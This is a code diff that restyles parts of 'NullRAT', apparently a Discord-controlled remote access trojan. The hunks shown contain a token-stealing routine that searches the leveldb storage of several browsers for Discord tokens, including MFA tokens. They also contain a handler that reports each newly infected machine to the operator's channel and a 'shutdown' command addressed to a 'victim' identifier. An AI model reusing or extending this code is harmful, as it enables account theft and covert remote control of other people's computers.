@@ -52,7 +52,7 @@ def find_token(self):
         "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
         "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",       "Chromium": local + "\\Chromium\\User Data\\Default"
     }
-    for platform, path in paths.items():
+    for path in paths.values():
         path += '\\Local Storage\\leveldb'
         try: 
             for file_name in os.listdir(path):
@@ -60,8 +60,7 @@ def find_token(self):
                     continue
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                     for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
-                        for token in re.findall(regex, line): 
-                            tokens.append(token)
+                        tokens.extend(iter(re.findall(regex, line)))
         except FileNotFoundError: continue
 
     return tokens
@@ -96,16 +95,18 @@ if os.path.isdir(nr_working) != True:
     
 @client.event
 async def on_ready():
-    embed = Embed(
-        title = f"NullRAT **IX** started on: **{client.identifier}**", 
-        description = f"Currently present in:\n```{client.original_dir}```",
-        timestamp = datetime.now()
-    ).set_author(
-        name="NullCode1337", 
-        url=r"http://null337.rf.gd/", 
-        icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
-    ).set_footer(
-        text = f"Identifier: " + client.identifier 
+    embed = (
+        Embed(
+            title=f"NullRAT **IX** started on: **{client.identifier}**",
+            description=f"Currently present in:\n```{client.original_dir}```",
+            timestamp=datetime.now(),
+        )
+        .set_author(
+            name="NullCode1337",
+            url=r"http://null337.rf.gd/",
+            icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png",
+        )
+        .set_footer(text=f"Identifier: {client.identifier}")
     )
     await client.get_channel(notification_channel).send(embed=embed)    
 
@@ -129,9 +130,9 @@ async def shutdown(ctx, victim):
     """
     if str(victim) == str(client.identifier):
         await ctx.response.send_message(
-            embed = client.genEmbed(
-                "Shutting down NullRAT for **" + client.identifier + "**...",
-                datetime.now()
+            embed=client.genEmbed(
+                f"Shutting down NullRAT for **{client.identifier}**...",
+                datetime.now(),
             )
         )
         await client.close()
